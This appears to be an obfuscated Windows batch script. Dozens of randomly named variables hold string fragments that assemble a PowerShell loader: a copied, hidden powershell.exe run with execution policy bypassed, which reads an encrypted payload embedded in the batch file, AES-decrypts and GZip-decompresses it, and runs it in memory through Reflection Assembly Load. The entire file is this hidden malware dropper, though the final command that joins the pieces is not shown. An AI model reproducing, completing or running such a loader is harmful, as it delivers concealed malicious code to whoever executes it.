@echo off
set "YOdPbXuAYk=ws"
set "fTSCGPuIUH=in"
set "IGubMXzeSX=ll"
set "EwNtOVrmVQ= C"
set "sbWMRtQTdC=py"
set "fIocDrPcAJ=rS"
set "YHItgwgBcF=we"
set "vUKJwcRjeD=he"
set "zetJGFceKx=nd"
set "AHJrzjzWWC=\W"
set "MaTqVfrQVZ=.e"
set "YFbWzkhbKT=:\"
set "EdSyuJUiSj=em"
set "sgNDZTuYnG=rs"
set "zHWTVqfKIF=ll"
set "tpfqUOvLDt=y "
set "mPjkQwZPek=s\"
set "bPxztWJMia=co"
set "FnZAEtqCbh=32"
set "FxQsbMZZmH=ow"
set "QSxteBJjML=\v"
set "kXmqdLuwTO=Po"
set "mfuVTDwrEV=po"
set "LhxYoDcefG=Wi"
set "jydYfcFZTQ=xe"
set "hdqmnoqfWC=st"
set "adAhpUdQIU=do"
set "PpcyzQXZrP=he"
set "sHxsHiLLAQ=we"
set "FXxzfyMuhn=0\"
set "kMuKiLMMRc= /"
set "SmgorUmsqU=Sy"
set "WrVkteXZWe=1."
set "PRjMPpjjiu= %~dp0"
set "eMKIrCfkbd=cd"
set "wjGzrNidJD=YxVw"
set "jRdmtwPsKv= = ["
set "clHOoscsIg=pose"
set "CBUpjGVBzX=ach "
set "GurnYyVuEQ=yTo("
set "fYsphRUviQ=oint"
set "goCaqGySve=tem."
set "aowiqUhfgj='[-1"
set "eWIiGFCZvM='gni"
set "rgGYabYUJZ=gsYZ"
set "oUgvTWqhbK=e = "
set "tFvrXZljZT=.Sec"
set "NysAwNlnVI=('Tg"
set "svGuFTkApn=esMa"
set "pNeaUYnPDg=fCyS"
set "tMkdNCpJhd=H = "
set "lJcEcgYxtH=ect "
set "MnaiORjcew=Stre"
set "uqgklpZXEI=m.IO"
set "iJxGibOYdN=1..-"
set "aIsFxfFqcR=k; }"
set "amlKXWEuDF=Fina"
set "kyLAsFERkS=g = "
set "IKHXUqtDBw=;$Wc"
set "bzvTQcXHjj=YqXT"
set "fTfcjMseBO=Xwlk"
set "QrTOykZnVb=in $"
set "fIhIqgtxUn=daeR"
set "iWnTkjrxrh= '')"
set "MXWNrTALKl=urit"
set "WBOZIFdycE=-1.."
set "UddbsTpHyO=F'[-"
set "yPRfEvQkzq=-4] "
set "plStfkTfxE=3); "
set "vrsYxjmlir=pres"
set "KYLJNdsglx=V = "
set "LrtnvUzttv=Disp"
set "NPqLXwskLc=grap"
set "VGOCbnsiij=rans"
set "eVAykDAQQd=ew-O"
set "mlnktOqGmE=();$"
set "ciDuzZMVPL=[Sys"
set "zbwTRUOetI=am;$"
set "AXXHxyEcSz=esaB"
set "inzVjmDLvb=ewLi"
set "YqmVaTnYLm=ptor"
set "gSjbMYvdLF='txe"
set "azsxTCMACA=[IO."
set "TkpKpWrpPY=.Com"
set "JkfekMqYjW=m.Re"
set "nrXONmFKhF=ecry"
set "hezLkmGhbt=)($Y"
set "ZmrHkCqvFX=y.Pa"
set "FsBUtkrLPh=$fCy"
set "dqaYYBGjwH=le  "
set "sCPCysUHfy='0Pg"
set "ssehyokWor=gMod"
set "aivLiiUfga=;$EY"
set "TKdksMaOnd=.Cop"
set "pdRteUAZpo=lBlo"
set "eDDFOPgSMH===')"
set "yUUbjqmFBr=ddin"
set "hzJQMynlpq=flec"
set "rjNKnqMTRO=tem."
set "MrhSiQnDNw=File"
set "zxvlFSnYsV=.Len"
set "gttWKUxYMu=Comp"
set "kcCbdGeajf=raph"
set "HBVbUvwKtg=::('"
set "FCdGHgcliT= [Sy"
set "lzRpXOUzDd=]::C"
set "SlVnByTwDD=)))"
set "MUCfHloEXx=ne);"
set "sweztUKTOp=d;$y"
set "mYPcShKZcO=, $Y"
set "UoJvSRajNF==');"
set "wiudeVPRUs=iron"
set "gbwuyyEsno=trea"
set "PDGnYrqYyN=L4Yi"
set "QaqpRTIHJq=CFxo"
set "feuFMkQjDa=ke($"
set "TBHqdOcveV=ion."
set "GpcRgknaZe= if "
set "sOfYhXHaLU= [Sy"
set "GDhbjklgeD=m.IO"
set "WyrqhsWlfl=-nop"
set "UPUtWwczOU=vert"
set "IYFDTNlEJs=Y, 0"
set "HAxxYXJvtZ=]::("
set "BPcxYIudEe=YqXT"
set "DTkoGsCtjc=nhB."
set "PWBUzmtnyV=6] -"
set "gtjqWShdYA=rt]:"
set "yTiTKErFPE=PTtG"
set "tTifqYkFoM=:('g"
set "YyJjFGijiV=7;$y"
set "ppWkfokiEa=pStr"
set "bpUcjJHKlE=Mode"
set "byducIxKKv=UGZH"
set "UVVqhWMELi=zHhH"
set "uGOgSlLiML=y.Ci"
set "EklgJLGQCF=y.Cr"
set "moVtDyUtfY=Wf.T"
set "gnsJTLpwZt=jWf "
set "SgkEYfoxPU=Secu"
set "oYKvNENZMM=$ZEA"
set "aKdoBSyjYL=BC;$"
set "EkIpfMETdK=:: '"
set "LQjmTOCDwZ=jWf."
set "dHKwCWrkKT=('%~f0'"
set "OJVidZZbpS== $y"
set "liUaoYhLNq=Bmor"
set "UCLhelfBNU=s75K"
set "jrMaEEcoAf=[Sys"
set "dfvYbGSClv=, (,"
set "DhiuqGzVxH= = $"
set "tkUVNWkcEE=nirt"
set "ZwDFXlPTZB=dMat"
set "AoBqCibKvz=$Uij"
set "urpJQAFbbA=and "
set "MqXRLmKynb=New-"
set "QdYNnMXerI=form"
set "aVjyLSkDab=bstr"
set "vSwxWsNoUj=Sn ="
set "UvwIjfSkzb=ment"
set "UJakVBqrMv=ose("
set "exUVyPUAim=nage"
set "IfytGRHqiX=[-1."
set "SoZKTspQnl=EYRX"
set "vxyWaOtZMy=Secu"
set "qLBGqlmtZa=ay()"
set "yaGYvOuVRN=saBm"
set "BKnCvuPmaZ=.GZi"
set "cdmHTOZhrm=-joi"
set "ZfgvbJMFqY=$YqX"
set "FYjxENsfXn=join"
set "jFuzEwauDF=).Sp"
set "HLmgDYoMUH=[Env"
set "DqQPZbKbnb=.Cry"
set "ZJtUkUCWEN=stem"
set "KdWmyxKBKG=1] -"
set "ualicobMOC=hB, "
set "uXxjngIqfC=yste"
set "rcBeoVmUUs=l5E7"
set "RciJfSCDfn=6esa"
set "jPqzAfaGyH=doR "
set "nBUjwRLhyI== [S"
set "wtsbnCUSMx=.IO."
set "QRPMbpbnJu=-joi"
set "ouSXxKeQDd=$Wcn"
set "SliXGJgAUO=ert]"
set "gDLYXxWoHC=bypa"
set "avqRatmUeT=stem"
set "uLGsBcxkHn=();$"
set "MnPRZNRAgb=at.I"
set "bfttYqrtCZ=EAdQ"
set "ybPEydwFOt=ose("
set "kuEAGXNPKK=ress"
set "RdZtrGVRQV=ress"
set "bbUuUUfUSu=rity"
set "McfTZumxTD=ZH.D"
set "YDndXaHpyh=Comp"
set "Llixmbgkhi=$ZEA"
set "gYCwztVnLH=dj0C"
set "mQXAAPsCXT=Obje"
set "EeWpWHFLjA=yste"
set "jUTXLEqleD=oArr"
set "VzBpcGusmy=e]::"
set "huzYjhBmUP=);$y"
set "upYcWMfTem=stem"
set "VtAXtZIvEg=[]] "
set "FCtyZxfsSc=PKCS"
set "XLyNECaaFQ=gth)"
set "MHAjKJCziX=tryP"
set "DmNOUfwVjB=dQ.T"
set "RlcrwcGdrK=doR."
set "CqZVhZBFwD=]::("
set "psEtcsuxfj=pher"
set "fzLkXEqXex=n ''"
set "TdVjBaziPC=yste"
set "JzvFvsiVfe=dMat"
set "HYueaABHAE=tem."
set "dZUiBtUkBa=16] "
set "rnXhXDZUmZ=('%*'"
set "OWQRGEMcSV=ionM"
set "HCahMArTTF=onve"
set "vdmRwlrtuB=$ydM"
set "xNGxgqHlcv=tion"
set "QTCmIjqhgQ=ck($"
set "FdIrmzOFFa= = N"
